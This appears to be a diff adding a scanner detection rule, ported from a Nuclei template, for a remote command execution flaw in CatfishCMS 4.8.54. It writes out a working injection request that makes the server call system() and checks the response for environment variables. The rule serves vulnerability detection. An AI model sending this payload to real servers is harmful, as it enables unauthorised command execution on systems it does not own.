@@ -1,0 +1,38 @@
+schema_version: 1
+id: "cortex.community:cnvd-2019-06255"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "CatfishCMS - Remote Command Execution"
+  description: "CatfishCMS 4.8.54 contains a remote command execution vulnerability in the \"method\" parameter. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://its401.com/article/yun2diao/91344725"
+    - "https://github.com/xwlrbh/Catfish/issues/4"
+  cwes: [77]
+  tags: ["cnvd", "cnvd2019", "rce", "catfishcms", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "Critical"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/" }
+  - id: "probe1"
+    request: { method: "GET", path: "/s=set&_method=__construct&method=*&filter[]=system" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    all:
+      - contains: { left: { ref: "steps.probe0.body" }, right: { value: "content=\"Catfish CMS" } }
+      - all:
+          - all:
+              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "OS" } }
+              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "PATH" } }
+              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "SHELL" } }
+              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "USER" } }
+          - eq: { left: { ref: "steps.probe1.status" }, right: { value: 200 } }
